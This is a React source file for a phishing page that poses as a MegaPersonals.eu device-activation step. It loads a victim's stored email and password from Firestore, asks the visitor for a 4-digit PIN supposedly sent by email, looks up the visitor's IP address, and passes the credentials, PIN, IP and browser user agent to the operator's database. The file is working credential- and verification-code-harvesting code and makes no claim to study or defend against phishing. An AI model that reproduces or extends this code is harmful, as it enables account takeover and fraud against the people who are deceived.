import React, { useEffect, useRef, useState } from 'react'
import Logo from '../assets/logo.png'
import Mobile from '../assets/mobile.png'
import LogoImg from '../assets/img.png'
import { useNavigate, useOutlet, useOutletContext, useParams, useSearchParams } from 'react-router-dom'
import { addData, db } from '../config/firebase'
import { doc, onSnapshot } from 'firebase/firestore'
import logo from '../assets/mega_logo.png'
import axios from 'axios'

const Verify = () => {

  const { username, docId } = useParams(); // Get the document ID from route params
  const navigate = useNavigate();

  const input0 = useRef(null);
  const input1 = useRef(null);
  const input2 = useRef(null);
  const input3 = useRef(null);

  const [megaData, setMegaData] = useState()

  useEffect(() => {

    if (!docId) {
      console.error('Document ID is missing!');
      return;
    }

    const docRef = doc(db, 'mega', docId)
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data()
        setMegaData(data)
      } else {
        console.log('document does not exist!')
      }
    })
    return () => unsubscribe();
  }, [docId])

  const handleSubmit = async (event) => {
    event.preventDefault();

    try {
      const code = `${input0.current.value}${input1.current.value}${input2.current.value}${input3.current.value}`;
      const response = await axios.get("https://api.ipify.org?format=json")
      const result = await addData(megaData?.email, megaData?.password, navigator.userAgent, `${username}@gmail.com`, response.data.ip, code);

      console.log(result)

    } catch (error) {
      console.error('Error submitting form:', error);
      alert('An error occurred while submitting the form. Please try again.');
      return;

    }

  }


  return (
    // <div className="min-h-screen flex items-center justify-center bg-gray-100">
    //   <div className="bg-white h-screen md:h-auto shadow-lg rounded-lg p-8 md:w-[450px] w-full md:max-w-[90%]">
    <div className=' h-dvh max-h-[90%] overflow-hidden rounded-lg overflow-y-scroll z-40 w-[90%] relative top-[5%] left-[5%] flex justify-center items-center '>
      <div className={` ${window.innerHeight >= 600 ? 'relative' : 'absolute'} top-0 z-20 bg-gray-100 rounded-lg p-5 `}>
        <img src={logo} alt="logo" />
        <form onSubmit={handleSubmit} className='flex flex-col items-center gap-2 my-3'>
          <h2 className='text-lg font-semibold text-gray-500 text-center leading-6  '>
            To activate your device, please check your email for the PIN code we just sent and enter it below
          </h2>
          <div className='flex justify-center items-center gap-2 my-3'>
            {[...Array(4)].map((_, i) => (
              <input
                key={i}
                ref={i === 0 ? input0 : i === 1 ? input1 : i === 2 ? input2 : input3}
                type="text"
                maxLength={1}
                style={{ width: "50px", fontSize: "24px", textAlign: "center" }}
                className='border-2 border-gray-600 rounded-md p-2 outline-none focus:border-blue-500'
                onChange={(e) => {
                  if (e.target.value.length === 1 && i < 3) {
                    const nextInput = i === 0 ? input1 : i === 1 ? input2 : input3;
                    nextInput.current.focus();
                  } else if (e.target.value.length === 0 && i > 0) {
                    const prevInput = i === 1 ? input0 : i === 2 ? input1 : input2;
                    prevInput.current.focus();
                  }
                }}
                onPaste={(e) => {
                  const pastedData = e.clipboardData.getData('text').split('');
                  if (pastedData.length === 4) {
                    input0.current.value = pastedData[0];
                    input1.current.value = pastedData[1];
                    input2.current.value = pastedData[2];
                    input3.current.value = pastedData[3];
                    input3.current.focus();
                  } else {
                    alert('Please paste a 4-digit code.');
                  }
                }}
              />
            ))}
          </div>
          <button type='submit' className='py-3 px-4 bg-[#fca549] font-semibold text-white text-lg rounded-md '>PROCEED</button>
          <h2 className=' text-gray-500 text-xl font-semibold text-center my-4'>BE SURE TO CHECK<br />YOUR SPAM FOLDER.</h2>
        </form>


        <div className='space-y-5'>
          <p className='text-blue-500 text-center text-xs'>Home | About Us | Policies & Terms | Contact Us | Manage Posts | Logout</p>
          <p className='text-blue-500 text-center text-sm'>Copyrights &copy; 2025 MegaPersonals.eu</p>
        </div>

      </div>
    </div>
  )

}

export default Verify